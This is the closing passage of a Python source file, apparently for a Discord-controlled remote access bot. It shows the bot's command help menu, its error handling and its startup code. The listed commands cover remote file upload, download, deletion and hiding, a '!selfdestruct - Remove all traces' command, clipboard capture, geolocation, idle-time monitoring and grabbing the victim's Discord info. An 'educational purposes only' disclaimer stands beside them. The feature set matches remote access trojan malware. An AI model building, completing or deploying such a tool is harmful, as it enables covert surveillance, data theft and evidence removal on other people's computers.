            "!cd <path> - Change directory",
            "!currentdir - Show current directory",
            "!displaydir - List directory contents",
            "!upload - Upload file",
            "!download <path> - Download file",
            "!delete <path> - Delete file",
            "!hide/unhide <path> - Hide/unhide file",
            "!selfdestruct - Remove all traces"
        ],
        "Hardware": [
            "!displayon/displayoff - Monitor control",
            "!ejectcd/retractcd - CD drive control",
            "!volumemax/volumezero - Volume control",
            "!wallpaper - Change wallpaper"
        ],
        "Other": [
            "!clipboard - Get clipboard",
            "!message <text> - Show message box",
            "!voice <text> - Text to speech",
            "!website <url> - Open website",
            "!geolocate - Get approximate location",
            "!idletime - User idle time",
            "!getdiscordinfo - Get Discord info"
        ]
    }
    
    for category, cmds in commands_info.items():
        embed.add_field(name=category, value="\n".join(cmds), inline=False)
    
    await ctx.send(embed=embed)

# Error handling
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("❌ You don't have permission to use this command.")
    else:
        await ctx.send(f"❌ Error: {str(error)}")

if __name__ == "__main__":
    # Validate configuration
    if DISCORD_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ERROR: Please set your DISCORD_TOKEN in the configuration section!")
        sys.exit(1)
    
    if ADMIN_USER_ID == 123456789012345678:
        print("❌ ERROR: Please set your ADMIN_USER_ID in the configuration section!")
        sys.exit(1)
    
    print("🚀 Starting Discord Remote Admin Bot...")
    print("⚠️  WARNING: This software is for educational purposes only!")
    print("⚠️  Only use on systems you own and have permission to access!")
    
    try:
        bot.run(DISCORD_TOKEN)
    except discord.LoginFailure:
        print("❌ Invalid Discord token. Please check your DISCORD_TOKEN.")
    except Exception as e:

        print(f"❌ Error starting bot: {e}")

